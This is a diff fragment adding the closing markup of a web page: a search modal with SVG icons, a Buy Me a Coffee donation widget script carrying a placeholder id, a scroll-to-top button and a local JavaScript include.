+      </footer>
+      <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search">
+         <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
+         <div class="search-modal-container">
+            <div class="search-input-wrapper">
+               <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+               </svg>
+               <input 
+                  type="search" 
+                  id="search-input" 
+                  class="search-input" 
+                  placeholder="Search..." 
+                  autocomplete="off"
+                  aria-label="Search input"
+                  >
+               <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
+                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                  </svg>
+               </button>
+               <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
+                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                  </svg>
+               </button>
+            </div>
+            <div id="search-results" class="search-results"></div>
+         </div>
+      </div>
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="yourwidgetid" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
+         <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+         </svg>
+      </button>
+      <script src="/js/index.js" defer></script>
+   </body>
+</html>
